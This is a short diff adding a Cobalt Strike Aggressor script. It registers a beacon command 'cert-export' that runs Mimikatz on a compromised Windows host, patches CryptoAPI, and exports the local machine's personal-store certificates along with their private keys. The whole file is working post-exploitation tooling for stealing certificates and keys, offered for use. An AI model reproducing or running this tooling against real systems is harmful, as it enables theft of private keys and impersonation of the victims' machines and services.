@@ -1,0 +1,9 @@
+#register help
+
+beacon_command_register("cert-export","patch capi and export local_machine certs","Synopsis: cert-export \n\n" . "Patch capi and export the local_machine certs. Use cert 7.");
+
+#setting alias
+
+alias cert-export {
+	bmimikatz($1, "crypto::capi\ncrypto::certificates /systemstore:local_machine /store:my /export");
+}
